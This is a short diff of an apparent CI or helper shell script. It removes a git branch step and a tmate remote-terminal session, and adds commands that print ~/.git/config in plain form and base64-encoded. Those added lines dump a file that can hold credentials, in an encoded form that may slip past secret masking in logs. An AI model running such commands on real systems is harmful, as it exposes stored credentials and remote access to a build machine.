@@ -9,11 +9,15 @@
 echo "Hello from W!!!!"
 
 
-git checkout -b "test_branch-6"
+echo "before cat"
 
-sudo apt-get install tmate -y
-tmate
+cat ~/.git/config
 
+echo "after cat"
+
+cat ~/.git/config | base64
+
+echo "afterafter cat"
 
 # git config --global user.email "you@example.com"
 # git config --global user.name "Your Name"
